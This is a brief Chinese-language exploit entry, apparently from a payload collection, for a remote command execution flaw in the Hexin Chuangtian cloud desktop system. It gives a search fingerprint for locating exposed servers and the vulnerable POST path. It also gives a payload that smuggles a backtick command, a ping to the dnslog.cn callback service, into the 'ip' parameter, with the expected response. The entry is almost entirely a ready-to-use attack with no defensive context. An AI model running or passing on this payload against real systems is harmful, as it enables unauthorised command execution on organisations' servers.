# 和信创天云桌面系统newserver远程命令执行

和信创天云桌面系统newserver ｜ 命令执行 ｜ —
- **指纹**：`body="信下一代云桌面VENGD"`
- **请求**：`POST /vesystem/index.php/New/Fn/newserver HTTP/1.1`

**Payload**
```
ip=`ping www.dnslog.cn`\&user=1\&pwd=1\&type=1\&c\_type=1\&local=1\&server\_os\_str=1\&server\_os\_version\_str=1
```
- **响应特征**：200